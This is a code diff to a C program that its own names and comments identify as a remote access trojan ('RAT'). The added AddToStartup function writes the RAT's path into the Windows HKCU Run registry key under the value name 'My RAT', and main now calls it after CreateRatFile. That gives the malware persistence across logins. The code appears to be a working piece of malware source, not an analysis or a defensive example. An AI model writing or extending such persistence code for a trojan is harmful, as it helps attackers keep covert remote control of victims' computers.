@@ -33,12 +33,40 @@ void CreateRatFile(HANDLE hProcess, char* szCmdLine)
     CloseHandle(pi.hThread);
 }
 
+// Function to add RAT file to system startup
+void AddToStartup(char* szCmdLine)
+{
+    HKEY hKey;
+    LONG lResult;
+
+    // Open the "Run" key for the current user.
+    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
+    if (lResult != ERROR_SUCCESS)
+    {
+        printf("Error opening Run key: %lu\n", lResult);
+        return;
+    }
+
+    // Add the RAT file to the "Run" key.
+    lResult = RegSetValueExA(hKey, "My RAT", 0, REG_SZ, (BYTE*)szCmdLine, strlen(szCmdLine) + 1);
+    if (lResult != ERROR_SUCCESS)
+    {
+        printf("Error adding RAT file to Run key: %lu\n", lResult);
+        return;
+    }
+
+    printf("RAT file added to Run key successfully\n");
+
+    RegCloseKey(hKey);
+}
+
 int main()
 {
-    // Example usage of the CreateRatFile function
+    // Example usage of the CreateRatFile and AddToStartup functions
     HANDLE hProcess = GetCurrentProcess();
     char* szCmdLine = "path/to/RAT/file.exe";
     CreateRatFile(hProcess, szCmdLine);
+    AddToStartup(szCmdLine);
 
     return 0;
 }
